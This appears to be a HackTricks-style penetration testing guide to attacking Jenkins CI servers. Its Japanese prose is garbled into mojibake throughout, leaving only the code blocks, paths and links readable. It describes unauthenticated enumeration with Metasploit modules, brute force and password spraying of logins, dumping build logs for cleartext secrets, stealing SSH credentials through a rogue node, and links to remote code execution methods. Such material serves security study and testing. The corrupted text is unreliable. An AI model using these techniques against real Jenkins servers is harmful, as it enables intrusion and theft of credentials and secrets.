# Jenkinsã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£

<details>

<summary><strong>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹**ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## åŸºæœ¬æƒ…å ±

Jenkinsã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€**ã»ã¨ã‚“ã©ã®**è¨€èªã¨ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒªã®**çµ„ã¿åˆã‚ã›**ã«å¯¾ã—ã¦ã€**ç¶™ç¶šçš„ãªçµ±åˆ**ã¾ãŸã¯**ç¶™ç¶šçš„ãªãƒ‡ãƒªãƒãƒªãƒ¼**ï¼ˆCI/CDï¼‰ç’°å¢ƒã‚’ç°¡å˜ã«è¨­å®šã™ã‚‹æ–¹æ³•ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚ã¾ãŸã€ä»–ã®é–‹ç™ºã‚¿ã‚¹ã‚¯ã®è‡ªå‹•åŒ–ã‚‚è¡Œã„ã¾ã™ã€‚Jenkinsã¯ã€å€‹ã€…ã®ã‚¹ãƒ†ãƒƒãƒ—ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆä½œæˆã®**å¿…è¦æ€§ã‚’æ’é™¤ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“**ãŒã€ãƒ“ãƒ«ãƒ‰ã€ãƒ†ã‚¹ãƒˆã€ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãƒ„ãƒ¼ãƒ«ã®ã™ã¹ã¦ã®ãƒã‚§ãƒ¼ãƒ³ã‚’çµ±åˆã™ã‚‹ãŸã‚ã®ã€ã‚ˆã‚Šè¿…é€Ÿã‹ã¤å …ç‰¢ãªæ–¹æ³•ã‚’æä¾›ã—ã¾ã™ã€‚\
[ã“ã“](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html)ã‹ã‚‰ã®å®šç¾©ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## èªè¨¼ã•ã‚Œã¦ã„ãªã„åˆ—æŒ™

èªè¨¼ãªã—ã§èˆˆå‘³æ·±ã„Jenkinsã®ãƒšãƒ¼ã‚¸ï¼ˆ_/people_ã‚„_/asynchPeople_ãªã©ã€ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆï¼‰ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
èªè¨¼ãªã—ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
èªè¨¼æƒ…å ±ãŒãªãã¦ã‚‚ã€_**/asynchPeople/**_ ãƒ‘ã‚¹ã¾ãŸã¯ _**/securityRealm/user/admin/search/index?q=**_ ã§ **ãƒ¦ãƒ¼ã‚¶ãƒ¼å** ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Jenkinsã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯ã€_**/oops**_ ã¾ãŸã¯ _**/error**_ ã®ãƒ‘ã‚¹ã‹ã‚‰å–å¾—ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

![](<../../.gitbook/assets/image (48).png>)

### æ—¢çŸ¥ã®è„†å¼±æ€§

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ãƒ­ã‚°ã‚¤ãƒ³

åŸºæœ¬æƒ…å ±ã§ã¯ã€**Jenkinsã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹æ–¹æ³•** ã‚’ã™ã¹ã¦ç¢ºèªã§ãã¾ã™ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ç™»éŒ²

Jenkinsã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã‚Œã»ã©ç°¡å˜ã§ã™ã€‚**

### **SSOãƒ­ã‚°ã‚¤ãƒ³**

ã¾ãŸã€**SSOæ©Ÿèƒ½/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³**ãŒå­˜åœ¨ã™ã‚‹å ´åˆã¯ã€ãƒ†ã‚¹ãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆã¤ã¾ã‚Šã€ãƒ†ã‚¹ãƒˆ**Github/Bitbucketã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ãƒ­ã‚°ã‚¤ãƒ³**ã‚’è©¦ã¿ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚[**ã“ã“**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**Jenkins** ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã® **ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹å¯¾ç­–** ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€ãŠãã‚‰ã **å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼åãã®ã¾ã¾ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚„**é€†ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ãŸã‚ã€å¸¸ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® **ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹** ã‚’è©¦ã™ã¹ãã§ã™ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚¹ãƒ—ãƒ¬ãƒ¼

[ã“ã®Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)ã¾ãŸã¯[ã“ã®PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/chryzsh/JenkinsPasswordSpray)ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

### IPãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆå›é¿

å¤šãã®çµ„ç¹”ã¯ã€**GitHubã‚„GitLab**ã®ã‚ˆã†ãª**SaaSãƒ™ãƒ¼ã‚¹ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ç®¡ç†ï¼ˆSCMï¼‰ã‚·ã‚¹ãƒ†ãƒ **ã¨ã€**Jenkinsã‚„TeamCity**ãªã©ã®**å†…éƒ¨ã®è‡ªå·±ãƒ›ã‚¹ãƒˆå‹CIã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’çµ„ã¿åˆã‚ã›ã¦ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€CIã‚·ã‚¹ãƒ†ãƒ ã¯**SaaSã‚½ãƒ¼ã‚¹ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ™ãƒ³ãƒ€ãƒ¼ã‹ã‚‰ã®ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆã‚’å—ã‘å–ã‚Š**ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚¸ãƒ§ãƒ–ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€çµ„ç¹”ã¯**SCMã®IPç¯„å›²ã‚’ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆ**ã«ç™»éŒ²ã—ã€**ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯**ã‚’ä»‹ã—ã¦**å†…éƒ¨ã®CIã‚·ã‚¹ãƒ†ãƒ **ã«åˆ°é”ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚ãŸã ã—ã€**èª°ã§ã‚‚**GitHubã‚„GitLabã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã€**ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œã«ã‚ˆã£ã¦**å†…éƒ¨ã®CIã‚·ã‚¹ãƒ†ãƒ **ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## å†…éƒ¨ã®Jenkinsã®æ‚ªç”¨

ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã™ã€‚

{% hint style="warning" %}
Jenkinsã§æ§‹æˆã•ã‚ŒãŸ**èªè¨¼**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã«ã‚ˆã£ã¦ã¯ã€ä»¥ä¸‹ã®æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã‚‹ã‹ã©ã†ã‹ãŒç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

è©³ç´°ã«ã¤ã„ã¦ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä¸€è¦§è¡¨ç¤º

Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ä»–ã®ç™»éŒ²æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ã§ä¸€è¦§è¡¨ç¤ºã§ãã¾ã™ã€‚

### ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®ç§˜å¯†ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ãƒ“ãƒ«ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹

[ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ“ãƒ«ãƒ‰ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«å‡ºåŠ›ã¨ãƒ“ãƒ«ãƒ‰ç’°å¢ƒå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã—ã€ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®ç§˜å¯†ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSHè³‡æ ¼æƒ…å ±ã®ç›—ã¿å‡ºã—**

ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**æ–°ã—ã„Jenkinsãƒãƒ¼ãƒ‰ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹**å ´åˆã€æ—¢ã«ä»–ã®ãƒãƒ¼ãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹SSHè³‡æ ¼æƒ…å ±ã‚’**ç›—ã¿å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ›ã‚¹ãƒˆã‚­ãƒ¼ã‚’æ¤œè¨¼ã›ãšã«è³‡æ ¼æƒ…å ±ã‚’è¨˜éŒ²ã™ã‚‹ãƒ›ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚

![](<../../.gitbook/assets/image (56).png>)

é€šå¸¸ã€Jenkinsã®SSHè³‡æ ¼æƒ…å ±ã¯**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€**ï¼ˆ`/credentials/`ï¼‰ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ä»–ã®ç§˜å¯†æƒ…å ±ã¨åŒæ§˜ã«ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è©³ç´°ã¯[**ç§˜å¯†æƒ…å ±ã®ãƒ€ãƒ³ãƒ—ã‚»ã‚¯ã‚·ãƒ§ãƒ³**](./#dumping-secrets)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### **Jenkinsã§ã®RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰**

Jenkinsã‚µãƒ¼ãƒãƒ¼ã§**ã‚·ã‚§ãƒ«ã‚’å–å¾—**ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ã™ã¹ã¦ã®**ç§˜å¯†æƒ…å ±**ã‚„**ç’°å¢ƒå¤‰æ•°**ã‚’æ¼æ´©ã•ã›ã€åŒã˜ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã‚ã‚‹ä»–ã®ãƒã‚·ãƒ³ã‚’**æ”»æ’ƒ**ã—ãŸã‚Šã€ã•ã‚‰ã«ã¯**ã‚¯ãƒ©ã‚¦ãƒ‰ã®è³‡æ ¼æƒ…å ±ã‚’åé›†**ã—ãŸã‚Šã™ã‚‹æ©Ÿä¼šã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Jenkinsã¯**ã€Œã‚·ã‚¹ãƒ†ãƒ ã¨ã—ã¦å®Ÿè¡Œã™ã‚‹ã€ãƒ“ãƒ«ãƒ‰**ã‚’è¡Œã„ã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒ“ãƒ«ãƒ‰ä¸­ã«å®Ÿè¡Œã•ã‚Œã‚‹ã™ã¹ã¦ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã¯ã€è‡ªç”±ã«è¡Œå‹•ã§ãã‚‹**å…¨èƒ½ã®SYSTEMãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®æ¨©é™ãŒä»˜ä¸ã•ã‚Œã¾ã™ã€‚

### **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE**

ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆ/å¤‰æ›´ã¯ã€Jenkinsã‚µãƒ¼ãƒãƒ¼ä¸Šã§RCEã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã§ã™ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã«ã‚ˆã‚‹RCE**

æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã‚ˆã‚Šã‚‚ã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒé«˜ã„å ´åˆã€Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã£ã¦ã‚‚**RCEã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®æ‚ªç”¨

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ã¾ãšJenkinsã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒå¿…è¦ã§ã™ã€‚

### ãƒ“ãƒ«ãƒ‰ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¯ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®**ãƒ“ãƒ«ãƒ‰ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ã—ã¦ã‚‚ä½¿ç”¨**ã§ãã¾ã™ã€‚ãã®å ´åˆã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ§‹æ–‡ãŒå«ã¾ã‚Œã‚‹**ãƒªãƒã‚¸ãƒˆãƒªå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€`/Jenkinsfile`ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š

![](<../../.gitbook/assets/image (14) (1) (1).png>)

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä»–ã®å ´æ‰€**ï¼ˆãŸã¨ãˆã°ä»–ã®ãƒªãƒã‚¸ãƒˆãƒªï¼‰ã«ä¿å­˜ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªãƒã‚¸ãƒˆãƒªã®**ã‚¢ã‚¯ã‚»ã‚¹**ã¨ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’**åˆ†é›¢**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ãŒãã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã›ãšã«ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’**å¤‰æ›´**ã—ã€**ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
æ”»æ’ƒè€…ã¯ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã«ã‚ˆã£ã¦ã¯ã€ã„ãã¤ã‹ã®ãƒ–ãƒ©ãƒ³ãƒä¿è­·ã‚’**ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æœ€ã‚‚ä¸€èˆ¬çš„ãªãƒˆãƒªã‚¬ãƒ¼ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã¸ã®**ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒã¸ã®å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ï¼‰
* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã¸ã®**ãƒ—ãƒƒã‚·ãƒ¥**ï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒã¸ã®å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ï¼‰
* ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã®**æ›´æ–°**ã¨ã€ä½•ã‚‰ã‹ã®æ–¹æ³•ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¾ã§ã®å¾…æ©Ÿ

{% hint style="info" %}
**å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®å ´åˆã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/çµ„ç¹”ã®ãƒªãƒã‚¸ãƒˆãƒªã®**ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã«PRã‚’ä½œæˆ**ã—ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã“ã¨ã¯æœŸå¾…ã—ãªã„ã§ãã ã•ã„...ãŸã ã—ã€**æ§‹æˆãŒä¸é©åˆ‡**ãªå ´åˆã¯ã€ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ä¼æ¥­ã‚’å®Œå…¨ã«**ä¾µå®³**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³RCE

ä»¥å‰ã®RCEã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€[**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§RCEã‚’å–å¾—**](./#rce-creating-modifying-pipeline)ã™ã‚‹ãŸã‚ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒæ—¢ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

### ç’°å¢ƒå¤‰æ•°ã®ãƒã‚§ãƒƒã‚¯

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å…¨ä½“ã¾ãŸã¯ç‰¹å®šã®ã‚¹ãƒ†ãƒ¼ã‚¸ã®ãŸã‚ã«**ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®ç’°å¢ƒå¤‰æ•°**ã‚’å®£è¨€ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ç’°å¢ƒå¤‰æ•°ã«ã¯**æ©Ÿå¯†æƒ…å ±ã¯å«ã¾ã‚Œã¦ã„ãªã„ã¯ãš**ã§ã™ãŒã€æ”»æ’ƒè€…ã¯å¸¸ã«ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ§‹æˆ/Jenkinsfileã‚’**ãƒã‚§ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒ€ãƒ³ãƒ—

Jenkinsã§ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒé€šå¸¸ã©ã®ã‚ˆã†ã«æ‰±ã‚ã‚Œã‚‹ã‹ã«ã¤ã„ã¦ã®æƒ…å ±ã¯ã€åŸºæœ¬æƒ…å ±ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

